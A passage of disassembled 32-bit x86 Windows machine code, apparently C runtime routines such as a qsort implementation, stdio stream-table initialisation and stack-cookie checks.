  40720f:	8b 7f 04             	mov    0x4(%edi),%edi
  407212:	eb 31                	jmp    0x407245
  407214:	33 c0                	xor    %eax,%eax
  407216:	39 45 08             	cmp    %eax,0x8(%ebp)
  407219:	0f 95 c0             	setne  %al
  40721c:	33 ff                	xor    %edi,%edi
  40721e:	50                   	push   %eax
  40721f:	ff 75 08             	push   0x8(%ebp)
  407222:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407225:	47                   	inc    %edi
  407226:	57                   	push   %edi
  407227:	56                   	push   %esi
  407228:	6a 09                	push   $0x9
  40722a:	ff 70 08             	push   0x8(%eax)
  40722d:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  407233:	85 c0                	test   %eax,%eax
  407235:	75 0e                	jne    0x407245
  407237:	e8 ff d5 ff ff       	call   0x40483b
  40723c:	83 cf ff             	or     $0xffffffff,%edi
  40723f:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  407245:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  407249:	74 0a                	je     0x407255
  40724b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40724e:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  407255:	8b c7                	mov    %edi,%eax
  407257:	5f                   	pop    %edi
  407258:	e9 31 ff ff ff       	jmp    0x40718e
  40725d:	8b ff                	mov    %edi,%edi
  40725f:	55                   	push   %ebp
  407260:	8b ec                	mov    %esp,%ebp
  407262:	6a 00                	push   $0x0
  407264:	ff 75 10             	push   0x10(%ebp)
  407267:	ff 75 0c             	push   0xc(%ebp)
  40726a:	ff 75 08             	push   0x8(%ebp)
  40726d:	e8 f1 fe ff ff       	call   0x407163
  407272:	83 c4 10             	add    $0x10,%esp
  407275:	5d                   	pop    %ebp
  407276:	c3                   	ret
  407277:	8b ff                	mov    %edi,%edi
  407279:	55                   	push   %ebp
  40727a:	8b ec                	mov    %esp,%ebp
  40727c:	56                   	push   %esi
  40727d:	8b 75 0c             	mov    0xc(%ebp),%esi
  407280:	8b 06                	mov    (%esi),%eax
  407282:	3b 05 54 42 41 00    	cmp    0x414254,%eax
  407288:	74 17                	je     0x4072a1
  40728a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40728d:	a1 98 36 41 00       	mov    0x413698,%eax
  407292:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  407298:	75 07                	jne    0x4072a1
  40729a:	e8 2a f4 ff ff       	call   0x4066c9
  40729f:	89 06                	mov    %eax,(%esi)
  4072a1:	5e                   	pop    %esi
  4072a2:	5d                   	pop    %ebp
  4072a3:	c3                   	ret
  4072a4:	8b ff                	mov    %edi,%edi
  4072a6:	55                   	push   %ebp
  4072a7:	8b ec                	mov    %esp,%ebp
  4072a9:	56                   	push   %esi
  4072aa:	8b 75 0c             	mov    0xc(%ebp),%esi
  4072ad:	8b 06                	mov    (%esi),%eax
  4072af:	3b 05 70 35 41 00    	cmp    0x413570,%eax
  4072b5:	74 17                	je     0x4072ce
  4072b7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4072ba:	a1 98 36 41 00       	mov    0x413698,%eax
  4072bf:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  4072c5:	75 07                	jne    0x4072ce
  4072c7:	e8 9f df ff ff       	call   0x40526b
  4072cc:	89 06                	mov    %eax,(%esi)
  4072ce:	5e                   	pop    %esi
  4072cf:	5d                   	pop    %ebp
  4072d0:	c3                   	ret
  4072d1:	8b ff                	mov    %edi,%edi
  4072d3:	55                   	push   %ebp
  4072d4:	8b ec                	mov    %esp,%ebp
  4072d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4072d9:	85 c0                	test   %eax,%eax
  4072db:	75 15                	jne    0x4072f2
  4072dd:	e8 59 d5 ff ff       	call   0x40483b
  4072e2:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4072e8:	e8 56 d3 ff ff       	call   0x404643
  4072ed:	83 c8 ff             	or     $0xffffffff,%eax
  4072f0:	5d                   	pop    %ebp
  4072f1:	c3                   	ret
  4072f2:	8b 40 10             	mov    0x10(%eax),%eax
  4072f5:	5d                   	pop    %ebp
  4072f6:	c3                   	ret
  4072f7:	a1 80 42 41 00       	mov    0x414280,%eax
  4072fc:	56                   	push   %esi
  4072fd:	6a 03                	push   $0x3
  4072ff:	5e                   	pop    %esi
  407300:	85 c0                	test   %eax,%eax
  407302:	75 07                	jne    0x40730b
  407304:	b8 00 02 00 00       	mov    $0x200,%eax
  407309:	eb 06                	jmp    0x407311
  40730b:	3b c6                	cmp    %esi,%eax
  40730d:	7d 07                	jge    0x407316
  40730f:	8b c6                	mov    %esi,%eax
  407311:	a3 80 42 41 00       	mov    %eax,0x414280
  407316:	6a 04                	push   $0x4
  407318:	50                   	push   %eax
  407319:	e8 ba cb ff ff       	call   0x403ed8
  40731e:	6a 00                	push   $0x0
  407320:	a3 84 42 41 00       	mov    %eax,0x414284
  407325:	e8 e3 ca ff ff       	call   0x403e0d
  40732a:	83 c4 0c             	add    $0xc,%esp
  40732d:	83 3d 84 42 41 00 00 	cmpl   $0x0,0x414284
  407334:	75 2b                	jne    0x407361
  407336:	6a 04                	push   $0x4
  407338:	56                   	push   %esi
  407339:	89 35 80 42 41 00    	mov    %esi,0x414280
  40733f:	e8 94 cb ff ff       	call   0x403ed8
  407344:	6a 00                	push   $0x0
  407346:	a3 84 42 41 00       	mov    %eax,0x414284
  40734b:	e8 bd ca ff ff       	call   0x403e0d
  407350:	83 c4 0c             	add    $0xc,%esp
  407353:	83 3d 84 42 41 00 00 	cmpl   $0x0,0x414284
  40735a:	75 05                	jne    0x407361
  40735c:	83 c8 ff             	or     $0xffffffff,%eax
  40735f:	5e                   	pop    %esi
  407360:	c3                   	ret
  407361:	57                   	push   %edi
  407362:	33 ff                	xor    %edi,%edi
  407364:	be a0 36 41 00       	mov    $0x4136a0,%esi
  407369:	6a 00                	push   $0x0
  40736b:	68 a0 0f 00 00       	push   $0xfa0
  407370:	8d 46 20             	lea    0x20(%esi),%eax
  407373:	50                   	push   %eax
  407374:	e8 b8 e5 ff ff       	call   0x405931
  407379:	a1 84 42 41 00       	mov    0x414284,%eax
  40737e:	8b d7                	mov    %edi,%edx
  407380:	c1 fa 06             	sar    $0x6,%edx
  407383:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  407386:	8b c7                	mov    %edi,%eax
  407388:	83 e0 3f             	and    $0x3f,%eax
  40738b:	6b c8 30             	imul   $0x30,%eax,%ecx
  40738e:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  407395:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  407399:	83 f8 ff             	cmp    $0xffffffff,%eax
  40739c:	74 09                	je     0x4073a7
  40739e:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4073a1:	74 04                	je     0x4073a7
  4073a3:	85 c0                	test   %eax,%eax
  4073a5:	75 07                	jne    0x4073ae
  4073a7:	c7 46 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%esi)
  4073ae:	83 c6 38             	add    $0x38,%esi
  4073b1:	47                   	inc    %edi
  4073b2:	81 fe 48 37 41 00    	cmp    $0x413748,%esi
  4073b8:	75 af                	jne    0x407369
  4073ba:	5f                   	pop    %edi
  4073bb:	33 c0                	xor    %eax,%eax
  4073bd:	5e                   	pop    %esi
  4073be:	c3                   	ret
  4073bf:	8b ff                	mov    %edi,%edi
  4073c1:	56                   	push   %esi
  4073c2:	e8 37 0a 00 00       	call   0x407dfe
  4073c7:	e8 6e 0c 00 00       	call   0x40803a
  4073cc:	33 f6                	xor    %esi,%esi
  4073ce:	a1 84 42 41 00       	mov    0x414284,%eax
  4073d3:	ff 34 06             	push   (%esi,%eax,1)
  4073d6:	e8 ff 0c 00 00       	call   0x4080da
  4073db:	a1 84 42 41 00       	mov    0x414284,%eax
  4073e0:	59                   	pop    %ecx
  4073e1:	8b 04 06             	mov    (%esi,%eax,1),%eax
  4073e4:	83 c0 20             	add    $0x20,%eax
  4073e7:	50                   	push   %eax
  4073e8:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  4073ee:	83 c6 04             	add    $0x4,%esi
  4073f1:	83 fe 0c             	cmp    $0xc,%esi
  4073f4:	75 d8                	jne    0x4073ce
  4073f6:	ff 35 84 42 41 00    	push   0x414284
  4073fc:	e8 0c ca ff ff       	call   0x403e0d
  407401:	83 25 84 42 41 00 00 	andl   $0x0,0x414284
  407408:	59                   	pop    %ecx
  407409:	5e                   	pop    %esi
  40740a:	c3                   	ret
  40740b:	8b ff                	mov    %edi,%edi
  40740d:	55                   	push   %ebp
  40740e:	8b ec                	mov    %esp,%ebp
  407410:	8b 45 08             	mov    0x8(%ebp),%eax
  407413:	83 c0 20             	add    $0x20,%eax
  407416:	50                   	push   %eax
  407417:	ff 15 b0 c0 40 00    	call   *0x40c0b0
  40741d:	5d                   	pop    %ebp
  40741e:	c3                   	ret
  40741f:	8b ff                	mov    %edi,%edi
  407421:	55                   	push   %ebp
  407422:	8b ec                	mov    %esp,%ebp
  407424:	8b 45 08             	mov    0x8(%ebp),%eax
  407427:	83 c0 20             	add    $0x20,%eax
  40742a:	50                   	push   %eax
  40742b:	ff 15 b4 c0 40 00    	call   *0x40c0b4
  407431:	5d                   	pop    %ebp
  407432:	c3                   	ret
  407433:	cc                   	int3
  407434:	cc                   	int3
  407435:	cc                   	int3
  407436:	cc                   	int3
  407437:	cc                   	int3
  407438:	cc                   	int3
  407439:	cc                   	int3
  40743a:	cc                   	int3
  40743b:	cc                   	int3
  40743c:	cc                   	int3
  40743d:	cc                   	int3
  40743e:	cc                   	int3
  40743f:	cc                   	int3
  407440:	8b ff                	mov    %edi,%edi
  407442:	55                   	push   %ebp
  407443:	8b ec                	mov    %esp,%ebp
  407445:	51                   	push   %ecx
  407446:	a1 04 30 41 00       	mov    0x413004,%eax
  40744b:	33 c5                	xor    %ebp,%eax
  40744d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407450:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407453:	53                   	push   %ebx
  407454:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  407457:	3b d9                	cmp    %ecx,%ebx
  407459:	76 6c                	jbe    0x4074c7
  40745b:	8b 45 10             	mov    0x10(%ebp),%eax
  40745e:	56                   	push   %esi
  40745f:	57                   	push   %edi
  407460:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  407463:	8b f2                	mov    %edx,%esi
  407465:	8b f9                	mov    %ecx,%edi
  407467:	3b f3                	cmp    %ebx,%esi
  407469:	77 28                	ja     0x407493
  40746b:	eb 03                	jmp    0x407470
  40746d:	8d 49 00             	lea    0x0(%ecx),%ecx
  407470:	8b 4d 14             	mov    0x14(%ebp),%ecx
  407473:	57                   	push   %edi
  407474:	56                   	push   %esi
  407475:	ff 15 60 c1 40 00    	call   *0x40c160
  40747b:	ff 55 14             	call   *0x14(%ebp)
  40747e:	83 c4 08             	add    $0x8,%esp
  407481:	85 c0                	test   %eax,%eax
  407483:	7e 02                	jle    0x407487
  407485:	8b fe                	mov    %esi,%edi
  407487:	8b 45 10             	mov    0x10(%ebp),%eax
  40748a:	03 f0                	add    %eax,%esi
  40748c:	3b f3                	cmp    %ebx,%esi
  40748e:	76 e0                	jbe    0x407470
  407490:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407493:	8b f0                	mov    %eax,%esi
  407495:	8b d3                	mov    %ebx,%edx
  407497:	3b fb                	cmp    %ebx,%edi
  407499:	74 21                	je     0x4074bc
  40749b:	85 c0                	test   %eax,%eax
  40749d:	74 1d                	je     0x4074bc
  40749f:	2b fb                	sub    %ebx,%edi
  4074a1:	8a 02                	mov    (%edx),%al
  4074a3:	8d 52 01             	lea    0x1(%edx),%edx
  4074a6:	8a 4c 17 ff          	mov    -0x1(%edi,%edx,1),%cl
  4074aa:	88 44 17 ff          	mov    %al,-0x1(%edi,%edx,1)
  4074ae:	88 4a ff             	mov    %cl,-0x1(%edx)
  4074b1:	83 ee 01             	sub    $0x1,%esi
  4074b4:	75 eb                	jne    0x4074a1
  4074b6:	8b 45 10             	mov    0x10(%ebp),%eax
  4074b9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4074bc:	2b d8                	sub    %eax,%ebx
  4074be:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  4074c1:	3b d9                	cmp    %ecx,%ebx
  4074c3:	77 9e                	ja     0x407463
  4074c5:	5f                   	pop    %edi
  4074c6:	5e                   	pop    %esi
  4074c7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4074ca:	33 cd                	xor    %ebp,%ecx
  4074cc:	5b                   	pop    %ebx
  4074cd:	e8 f6 a2 ff ff       	call   0x4017c8
  4074d2:	8b e5                	mov    %ebp,%esp
  4074d4:	5d                   	pop    %ebp
  4074d5:	c3                   	ret
  4074d6:	cc                   	int3
  4074d7:	cc                   	int3
  4074d8:	cc                   	int3
  4074d9:	cc                   	int3
  4074da:	cc                   	int3
  4074db:	cc                   	int3
  4074dc:	cc                   	int3
  4074dd:	cc                   	int3
  4074de:	cc                   	int3
  4074df:	cc                   	int3
  4074e0:	8b ff                	mov    %edi,%edi
  4074e2:	55                   	push   %ebp
  4074e3:	8b ec                	mov    %esp,%ebp
  4074e5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4074e8:	57                   	push   %edi
  4074e9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4074ec:	3b f8                	cmp    %eax,%edi
  4074ee:	74 26                	je     0x407516
  4074f0:	56                   	push   %esi
  4074f1:	8b 75 10             	mov    0x10(%ebp),%esi
  4074f4:	85 f6                	test   %esi,%esi
  4074f6:	74 1d                	je     0x407515
  4074f8:	2b f8                	sub    %eax,%edi
  4074fa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  407500:	8a 08                	mov    (%eax),%cl
  407502:	8d 40 01             	lea    0x1(%eax),%eax
  407505:	8a 54 07 ff          	mov    -0x1(%edi,%eax,1),%dl
  407509:	88 4c 07 ff          	mov    %cl,-0x1(%edi,%eax,1)
  40750d:	88 50 ff             	mov    %dl,-0x1(%eax)
  407510:	83 ee 01             	sub    $0x1,%esi
  407513:	75 eb                	jne    0x407500
  407515:	5e                   	pop    %esi
  407516:	5f                   	pop    %edi
  407517:	5d                   	pop    %ebp
  407518:	c3                   	ret
  407519:	cc                   	int3
  40751a:	cc                   	int3
  40751b:	cc                   	int3
  40751c:	cc                   	int3
  40751d:	cc                   	int3
  40751e:	cc                   	int3
  40751f:	cc                   	int3
  407520:	8b ff                	mov    %edi,%edi
  407522:	55                   	push   %ebp
  407523:	8b ec                	mov    %esp,%ebp
  407525:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  40752b:	a1 04 30 41 00       	mov    0x413004,%eax
  407530:	33 c5                	xor    %ebp,%eax
  407532:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407535:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407538:	8b 55 0c             	mov    0xc(%ebp),%edx
  40753b:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  407541:	56                   	push   %esi
  407542:	8b 75 14             	mov    0x14(%ebp),%esi
  407545:	89 b5 00 ff ff ff    	mov    %esi,-0x100(%ebp)
  40754b:	57                   	push   %edi
  40754c:	8b 7d 10             	mov    0x10(%ebp),%edi
  40754f:	89 bd 04 ff ff ff    	mov    %edi,-0xfc(%ebp)
  407555:	85 c9                	test   %ecx,%ecx
  407557:	75 24                	jne    0x40757d
  407559:	85 d2                	test   %edx,%edx
  40755b:	74 20                	je     0x40757d
  40755d:	e8 d9 d2 ff ff       	call   0x40483b
  407562:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  407568:	e8 d6 d0 ff ff       	call   0x404643
  40756d:	5f                   	pop    %edi
  40756e:	5e                   	pop    %esi
  40756f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407572:	33 cd                	xor    %ebp,%ecx
  407574:	e8 4f a2 ff ff       	call   0x4017c8
  407579:	8b e5                	mov    %ebp,%esp
  40757b:	5d                   	pop    %ebp
  40757c:	c3                   	ret
  40757d:	85 ff                	test   %edi,%edi
  40757f:	74 dc                	je     0x40755d
  407581:	85 f6                	test   %esi,%esi
  407583:	74 d8                	je     0x40755d
  407585:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  40758c:	00 00 00 
  40758f:	83 fa 02             	cmp    $0x2,%edx
  407592:	0f 82 12 03 00 00    	jb     0x4078aa
  407598:	4a                   	dec    %edx
  407599:	0f af d7             	imul   %edi,%edx
  40759c:	53                   	push   %ebx
  40759d:	03 d1                	add    %ecx,%edx
  40759f:	89 95 08 ff ff ff    	mov    %edx,-0xf8(%ebp)
  4075a5:	8b c2                	mov    %edx,%eax
  4075a7:	33 d2                	xor    %edx,%edx
  4075a9:	2b c1                	sub    %ecx,%eax
  4075ab:	f7 f7                	div    %edi
  4075ad:	8d 58 01             	lea    0x1(%eax),%ebx
  4075b0:	83 fb 08             	cmp    $0x8,%ebx
  4075b3:	77 16                	ja     0x4075cb
  4075b5:	56                   	push   %esi
  4075b6:	57                   	push   %edi
  4075b7:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  4075bd:	51                   	push   %ecx
  4075be:	e8 7d fe ff ff       	call   0x407440
  4075c3:	83 c4 10             	add    $0x10,%esp
  4075c6:	e9 b7 02 00 00       	jmp    0x407882
  4075cb:	d1 eb                	shr    $1,%ebx
  4075cd:	0f af df             	imul   %edi,%ebx
  4075d0:	03 d9                	add    %ecx,%ebx
  4075d2:	53                   	push   %ebx
  4075d3:	51                   	push   %ecx
  4075d4:	8b ce                	mov    %esi,%ecx
  4075d6:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  4075dc:	ff 15 60 c1 40 00    	call   *0x40c160
  4075e2:	ff d6                	call   *%esi
  4075e4:	83 c4 08             	add    $0x8,%esp
  4075e7:	85 c0                	test   %eax,%eax
  4075e9:	7e 10                	jle    0x4075fb
  4075eb:	57                   	push   %edi
  4075ec:	53                   	push   %ebx
  4075ed:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  4075f3:	e8 e8 fe ff ff       	call   0x4074e0
  4075f8:	83 c4 0c             	add    $0xc,%esp
  4075fb:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  407601:	8b ce                	mov    %esi,%ecx
  407603:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  407609:	ff 15 60 c1 40 00    	call   *0x40c160
  40760f:	ff d6                	call   *%esi
  407611:	83 c4 08             	add    $0x8,%esp
  407614:	85 c0                	test   %eax,%eax
  407616:	7e 15                	jle    0x40762d
  407618:	57                   	push   %edi
  407619:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  40761f:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  407625:	e8 b6 fe ff ff       	call   0x4074e0
  40762a:	83 c4 0c             	add    $0xc,%esp
  40762d:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  407633:	8b ce                	mov    %esi,%ecx
  407635:	53                   	push   %ebx
  407636:	ff 15 60 c1 40 00    	call   *0x40c160
  40763c:	ff d6                	call   *%esi
  40763e:	83 c4 08             	add    $0x8,%esp
  407641:	85 c0                	test   %eax,%eax
  407643:	7e 10                	jle    0x407655
  407645:	57                   	push   %edi
  407646:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  40764c:	53                   	push   %ebx
  40764d:	e8 8e fe ff ff       	call   0x4074e0
  407652:	83 c4 0c             	add    $0xc,%esp
  407655:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  40765b:	8b f8                	mov    %eax,%edi
  40765d:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  407663:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  407669:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  40766f:	90                   	nop
  407670:	3b de                	cmp    %esi,%ebx
  407672:	76 37                	jbe    0x4076ab
  407674:	03 f2                	add    %edx,%esi
  407676:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  40767c:	3b f3                	cmp    %ebx,%esi
  40767e:	73 25                	jae    0x4076a5
  407680:	8b 8d 00 ff ff ff    	mov    -0x100(%ebp),%ecx
  407686:	53                   	push   %ebx
  407687:	56                   	push   %esi
  407688:	ff 15 60 c1 40 00    	call   *0x40c160
  40768e:	ff 95 00 ff ff ff    	call   *-0x100(%ebp)
  407694:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  40769a:	83 c4 08             	add    $0x8,%esp
  40769d:	85 c0                	test   %eax,%eax
  40769f:	7e d3                	jle    0x407674
  4076a1:	3b de                	cmp    %esi,%ebx
  4076a3:	77 3d                	ja     0x4076e2
  4076a5:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  4076ab:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
  4076b1:	03 f2                	add    %edx,%esi
  4076b3:	3b f0                	cmp    %eax,%esi
  4076b5:	77 1f                	ja     0x4076d6
  4076b7:	53                   	push   %ebx
  4076b8:	56                   	push   %esi
  4076b9:	8b cf                	mov    %edi,%ecx
  4076bb:	ff 15 60 c1 40 00    	call   *0x40c160
  4076c1:	ff d7                	call   *%edi
  4076c3:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  4076c9:	83 c4 08             	add    $0x8,%esp
  4076cc:	85 c0                	test   %eax,%eax
  4076ce:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  4076d4:	7e db                	jle    0x4076b1
  4076d6:	8b bd ec fe ff ff    	mov    -0x114(%ebp),%edi
  4076dc:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  4076e2:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  4076e8:	eb 06                	jmp    0x4076f0
  4076ea:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4076f0:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  4076f6:	2b fa                	sub    %edx,%edi
  4076f8:	3b fb                	cmp    %ebx,%edi
  4076fa:	76 19                	jbe    0x407715
  4076fc:	53                   	push   %ebx
  4076fd:	57                   	push   %edi
  4076fe:	8b ce                	mov    %esi,%ecx
  407700:	ff 15 60 c1 40 00    	call   *0x40c160
  407706:	ff d6                	call   *%esi
  407708:	83 c4 08             	add    $0x8,%esp
  40770b:	85 c0                	test   %eax,%eax
  40770d:	7f e1                	jg     0x4076f0
  40770f:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  407715:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  40771b:	89 bd ec fe ff ff    	mov    %edi,-0x114(%ebp)
  407721:	3b fe                	cmp    %esi,%edi
  407723:	72 5e                	jb     0x407783
  407725:	89 95 e8 fe ff ff    	mov    %edx,-0x118(%ebp)
  40772b:	89 bd e4 fe ff ff    	mov    %edi,-0x11c(%ebp)
  407731:	3b f7                	cmp    %edi,%esi
  407733:	74 33                	je     0x407768
  407735:	8b de                	mov    %esi,%ebx
  407737:	8b d7                	mov    %edi,%edx
  407739:	8b b5 e8 fe ff ff    	mov    -0x118(%ebp),%esi
  40773f:	2b df                	sub    %edi,%ebx
  407741:	8a 02                	mov    (%edx),%al
  407743:	8d 52 01             	lea    0x1(%edx),%edx
  407746:	8a 4c 13 ff          	mov    -0x1(%ebx,%edx,1),%cl
  40774a:	88 44 13 ff          	mov    %al,-0x1(%ebx,%edx,1)
  40774e:	88 4a ff             	mov    %cl,-0x1(%edx)
  407751:	83 ee 01             	sub    $0x1,%esi
  407754:	75 eb                	jne    0x407741
  407756:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  40775c:	8b 9d f0 fe ff ff    	mov    -0x110(%ebp),%ebx
  407762:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  407768:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  40776e:	3b df                	cmp    %edi,%ebx
  407770:	0f 85 fa fe ff ff    	jne    0x407670
  407776:	8b de                	mov    %esi,%ebx
  407778:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  40777e:	e9 ed fe ff ff       	jmp    0x407670
  407783:	03 fa                	add    %edx,%edi
  407785:	3b df                	cmp    %edi,%ebx
  407787:	73 32                	jae    0x4077bb
  407789:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  407790:	2b fa                	sub    %edx,%edi
  407792:	3b fb                	cmp    %ebx,%edi
  407794:	76 25                	jbe    0x4077bb
  407796:	8b 8d 00 ff ff ff    	mov    -0x100(%ebp),%ecx
  40779c:	53                   	push   %ebx
  40779d:	57                   	push   %edi
  40779e:	ff 15 60 c1 40 00    	call   *0x40c160
  4077a4:	ff 95 00 ff ff ff    	call   *-0x100(%ebp)
  4077aa:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  4077b0:	83 c4 08             	add    $0x8,%esp
  4077b3:	85 c0                	test   %eax,%eax
  4077b5:	74 d9                	je     0x407790
  4077b7:	3b df                	cmp    %edi,%ebx
  4077b9:	72 2f                	jb     0x4077ea
  4077bb:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  4077c1:	2b fa                	sub    %edx,%edi
  4077c3:	3b bd fc fe ff ff    	cmp    -0x104(%ebp),%edi
  4077c9:	76 19                	jbe    0x4077e4
  4077cb:	53                   	push   %ebx
  4077cc:	57                   	push   %edi
  4077cd:	8b ce                	mov    %esi,%ecx
  4077cf:	ff 15 60 c1 40 00    	call   *0x40c160
  4077d5:	ff d6                	call   *%esi
  4077d7:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  4077dd:	83 c4 08             	add    $0x8,%esp
  4077e0:	85 c0                	test   %eax,%eax
  4077e2:	74 dd                	je     0x4077c1
  4077e4:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  4077ea:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  4077f0:	8b c7                	mov    %edi,%eax
  4077f2:	8b 9d fc fe ff ff    	mov    -0x104(%ebp),%ebx
  4077f8:	8b ca                	mov    %edx,%ecx
  4077fa:	2b ce                	sub    %esi,%ecx
  4077fc:	2b c3                	sub    %ebx,%eax
  4077fe:	3b c1                	cmp    %ecx,%eax
  407800:	7c 39                	jl     0x40783b
  407802:	3b df                	cmp    %edi,%ebx
  407804:	73 18                	jae    0x40781e
  407806:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  40780c:	89 9c 85 0c ff ff ff 	mov    %ebx,-0xf4(%ebp,%eax,4)
  407813:	89 7c 85 84          	mov    %edi,-0x7c(%ebp,%eax,4)
  407817:	40                   	inc    %eax
  407818:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  40781e:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  407824:	3b f2                	cmp    %edx,%esi
  407826:	73 4c                	jae    0x407874
  407828:	8b ce                	mov    %esi,%ecx
  40782a:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  407830:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  407836:	e9 6a fd ff ff       	jmp    0x4075a5
  40783b:	3b f2                	cmp    %edx,%esi
  40783d:	73 18                	jae    0x407857
  40783f:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  407845:	89 b4 85 0c ff ff ff 	mov    %esi,-0xf4(%ebp,%eax,4)
  40784c:	89 54 85 84          	mov    %edx,-0x7c(%ebp,%eax,4)
  407850:	40                   	inc    %eax
  407851:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  407857:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  40785d:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  407863:	3b cf                	cmp    %edi,%ecx
  407865:	73 15                	jae    0x40787c
  407867:	8b d7                	mov    %edi,%edx
  407869:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  40786f:	e9 2b fd ff ff       	jmp    0x40759f
  407874:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  40787a:	eb 06                	jmp    0x407882
  40787c:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  407882:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  407888:	83 e8 01             	sub    $0x1,%eax
  40788b:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  407891:	78 16                	js     0x4078a9
  407893:	8b 8c 85 0c ff ff ff 	mov    -0xf4(%ebp,%eax,4),%ecx
  40789a:	8b 54 85 84          	mov    -0x7c(%ebp,%eax,4),%edx
  40789e:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  4078a4:	e9 f6 fc ff ff       	jmp    0x40759f
  4078a9:	5b                   	pop    %ebx
  4078aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4078ad:	5f                   	pop    %edi
  4078ae:	33 cd                	xor    %ebp,%ecx
  4078b0:	5e                   	pop    %esi
  4078b1:	e8 12 9f ff ff       	call   0x4017c8
  4078b6:	8b e5                	mov    %ebp,%esp
  4078b8:	5d                   	pop    %ebp
  4078b9:	c3                   	ret
  4078ba:	cc                   	int3
  4078bb:	cc                   	int3
  4078bc:	cc                   	int3
  4078bd:	cc                   	int3
  4078be:	cc                   	int3
  4078bf:	cc                   	int3
  4078c0:	55                   	push   %ebp
  4078c1:	8b ec                	mov    %esp,%ebp
  4078c3:	56                   	push   %esi
  4078c4:	33 c0                	xor    %eax,%eax
  4078c6:	50                   	push   %eax
  4078c7:	50                   	push   %eax
  4078c8:	50                   	push   %eax
